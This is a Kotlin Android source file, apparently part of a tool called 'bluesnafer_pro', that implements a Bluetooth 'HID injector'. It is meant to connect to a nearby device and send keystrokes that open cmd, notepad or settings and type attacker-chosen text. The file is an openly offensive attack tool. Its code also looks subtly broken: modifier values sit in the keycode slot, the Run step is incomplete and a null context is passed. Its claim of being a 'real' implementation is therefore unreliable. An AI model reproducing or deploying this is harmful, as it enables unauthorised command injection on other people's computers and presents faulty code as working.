package com.bluesnafer_pro

import android.bluetooth.*
import android.util.Log
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

/**
 * Real HID Injection implementation
 * Injects HID scripts via Bluetooth GATT
 */
object HIDInjector {
    private const val TAG = "HIDInjector"
    
    // HID Service UUIDs
    private val HID_SERVICE_UUID = UUID.fromString("00001812-0000-1000-8000-00805f9b34fb")
    private val HID_INFO_UUID = UUID.fromString("00002a4a-0000-1000-8000-00805f9b34fb")
    private val HID_REPORT_UUID = UUID.fromString("00002a4d-0000-1000-8000-00805f9b34fb")
    private val HID_CONTROL_UUID = UUID.fromString("00002a4c-0000-1000-8000-00805f9b34fb")
    
    /**
     * Inject HID script via GATT (for use with existing GATT connection)
     */
    fun injectScript(gatt: BluetoothGatt, script: String, callback: (String) -> Unit): Boolean {
        Log.d(TAG, "Injecting HID script via GATT: $script")
        callback("[HID] Starting injection via GATT: $script")
        
        return try {
            // Find HID service
            val service = gatt.services.find { it.uuid == HID_SERVICE_UUID }
            if (service == null) {
                callback("[HID] ✗ HID service not found")
                return false
            }
            
            callback("[HID] ✓ HID service found")
            
            // Get report characteristic
            val reportChar = service.getCharacteristic(HID_REPORT_UUID)
            if (reportChar == null) {
                callback("[HID] ✗ Report characteristic not found")
                return false
            }
            
            // Enable notifications if available
            gatt.setCharacteristicNotification(reportChar, true)
            
            // Parse script and send keystrokes
            val success = sendKeystrokes(gatt, reportChar, script, callback)
            
            if (success) {
                callback("[HID] ✓ Script executed successfully")
            } else {
                callback("[HID] ✗ Script execution failed")
            }
            
            success
        } catch (e: Exception) {
            Log.e(TAG, "HID injection error: ${e.message}")
            callback("[HID] ✗ Error: ${e.message}")
            false
        }
    }
    
    /**
     * Inject HID script via device (creates new GATT connection)
     */
    fun inject(device: BluetoothDevice, script: String, callback: (String) -> Unit): Map<*, *> {
        Log.d(TAG, "Injecting HID script via device connection: $script")
        callback("[HID] Connecting to ${device.address}...")
        
        return try {
            var success = false
            val latch = CountDownLatch(1)
            
            val gattCallback = object : BluetoothGattCallback() {
                override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                    if (newState == BluetoothProfile.STATE_CONNECTED) {
                        callback("[HID] ✓ Connected, discovering services...")
                        gatt.discoverServices()
                    } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                        callback("[HID] Disconnected")
                        latch.countDown()
                    }
                }
                
                override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        callback("[HID] Services discovered")
                        success = injectScript(gatt, script, callback)
                    }
                    gatt.disconnect()
                    gatt.close()
                    latch.countDown()
                }
            }
            
            val gatt = device.connectGatt(null, false, gattCallback)
            latch.await(10, TimeUnit.SECONDS)
            
            if (gatt == null) {
                callback("[HID] ✗ Failed to connect")
            }
            
            mapOf("success" to success)
        } catch (e: Exception) {
            Log.e(TAG, "HID connection error: ${e.message}")
            callback("[HID] ✗ Error: ${e.message}")
            mapOf("success" to false)
        }
    }
    
    /**
     * Send keystrokes based on script
     */
    private fun sendKeystrokes(gatt: BluetoothGatt, reportChar: BluetoothGattCharacteristic, script: String, callback: (String) -> Unit): Boolean {
        return try {
            val commands = script.lowercase().split(" ")
            var delay = 100L
            
            for (cmd in commands) {
                when {
                    cmd == "notepad" -> {
                        callback("[HID] Opening notepad...")
                        // Win + R, then type notepad, Enter
                        sendKey(gatt, reportChar, 0x08, 0x00) // Win key down
                        Thread.sleep(100)
                        sendKey(gatt, reportChar, 0x00, 0x00) // Win key up
                        Thread.sleep(500)
                        
                        typeText(gatt, reportChar, "notepad", callback)
                        sendKey(gatt, reportChar, 0x28, 0x00) // Enter
                        Thread.sleep(500)
                    }
                    cmd == "wifi" -> {
                        callback("[HID] Opening WiFi settings...")
                        // Win + I for settings
                        sendKey(gatt, reportChar, 0x08, 0x00)
                        Thread.sleep(100)
                        sendKey(gatt, reportChar, 0x0C, 0x00) // I key
                        Thread.sleep(100)
                        sendKey(gatt, reportChar, 0x00, 0x00)
                        Thread.sleep(500)
                    }
                    cmd == "terminal" || cmd == "cmd" -> {
                        callback("[HID] Opening terminal...")
                        // Win + R
                        sendKey(gatt, reportChar, 0x08, 0x00)
                        Thread.sleep(100)
                        sendKey(gatt, reportChar, 0x15, 0x00) // R key
                        Thread.sleep(100)
                        sendKey(gatt, reportChar, 0x00, 0x00)
                        Thread.sleep(500)
                        
                        typeText(gatt, reportChar, "cmd", callback)
                        sendKey(gatt, reportChar, 0x28, 0x00)
                        Thread.sleep(500)
                    }
                    cmd.startsWith("type:") -> {
                        val text = cmd.substringAfter("type:")
                        typeText(gatt, reportChar, text, callback)
                    }
                    cmd == "enter" -> {
                        sendKey(gatt, reportChar, 0x28, 0x00)
                        Thread.sleep(delay)
                    }
                    cmd.startsWith("delay:") -> {
                        delay = cmd.substringAfter("delay:").toLongOrNull() ?: 100L
                    }
                }
                Thread.sleep(delay)
            }
            
            true
        } catch (e: Exception) {
            Log.e(TAG, "Keystroke error: ${e.message}")
            callback("[HID] ✗ Keystroke error: ${e.message}")
            false
        }
    }
    
    /**
     * Send a single key report
     */
    private fun sendKey(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, key: Int, modifier: Int) {
        val report = byteArrayOf(
            modifier.toByte(), // Modifier keys
            0x00, // Reserved
            key.toByte(), // Key code
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Other keys
        )
        
        characteristic.value = report
        gatt.writeCharacteristic(characteristic)
        Thread.sleep(20)
        
        // Send release
        val release = byteArrayOf(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
        characteristic.value = release
        gatt.writeCharacteristic(characteristic)
        Thread.sleep(20)
    }
    
    /**
     * Type text string
     */
    private fun typeText(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, text: String, callback: (String) -> Unit) {
        callback("[HID] Typing: $text")
        
        for (char in text) {
            val keyCode = charToKeyCode(char)
            if (keyCode >= 0) {
                sendKey(gatt, characteristic, keyCode, 0x00)
                Thread.sleep(50)
            }
        }
    }
    
    /**
     * Convert character to HID key code
     */
    private fun charToKeyCode(c: Char): Int {
        return when (c) {
            in 'a'..'z' -> c.code - 'a'.code + 0x04
            in 'A'..'Z' -> c.code - 'A'.code + 0x04
            in '0'..'9' -> if (c == '0') 0x27 else c.code - '1'.code + 0x1E
            ' ' -> 0x2C
            '.' -> 0x37
            ',' -> 0x36
            '\n' -> 0x28
            else -> 0x00 // Unknown
        }
    }
}
